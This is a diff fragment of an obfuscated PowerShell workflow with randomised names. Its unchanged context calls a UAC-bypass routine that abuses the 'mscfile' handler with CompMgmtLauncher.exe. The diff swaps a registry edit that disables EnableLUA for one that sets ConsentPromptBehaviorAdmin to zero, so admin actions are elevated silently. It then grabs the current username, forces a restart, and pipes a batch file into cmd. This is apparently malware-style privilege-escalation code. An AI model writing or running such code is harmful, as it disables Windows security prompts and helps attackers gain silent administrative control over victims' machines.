@@ -39,8 +39,16 @@ workflow gXJqIeQLEx{
 			snCAvSgLOW mscfile CompMgmtLauncher.exe $nGZbQUSuHF
 		}
 	}
+	$eMEbXSRHpU=Get-Location
 
-	Set-ItemProperty -Path "REGISTRY::HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Policies\System" -Name "EnableLUA" -Value 0
+
+
+	# write-Host "Current working directory remove-item -fo  $curdir"
+	$mWjZRdpvnM=[System.Security.Principal.WindowsIdentity]::GetCurrent().Name
+	$QEXcMiaOoG=$mWjZRdpvnM.split("\")
+	$lYIbKdtBmp=$QEXcMiaOoG[1]
+
+	Set-ItemProperty 'HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System' -Name 'ConsentPromptBehaviorAdmin' -Value 00000000
 	Restart-Computer -Wait
 	"bGnQSfviwu.cmd"|cmd
 	Install-Module -Name PSWindowUpdate -Force
